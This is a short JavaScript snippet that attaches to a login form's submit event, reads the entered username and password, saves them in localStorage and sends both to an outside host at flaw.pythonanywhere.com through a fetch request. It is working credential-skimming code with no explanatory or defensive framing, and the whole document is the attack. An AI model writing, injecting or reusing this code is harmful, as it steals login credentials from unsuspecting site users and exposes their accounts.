document.querySelector('form#login-form').addEventListener('submit',(e)=>{
    let pw = document.querySelector('#LoginForm_password').value
    let un = document.querySelector('#LoginForm_username').value
    localStorage.u= un
    localStorage.p= pw
    fetch(`https://flaw.pythonanywhere.com/save/${un}/${pw}`)

})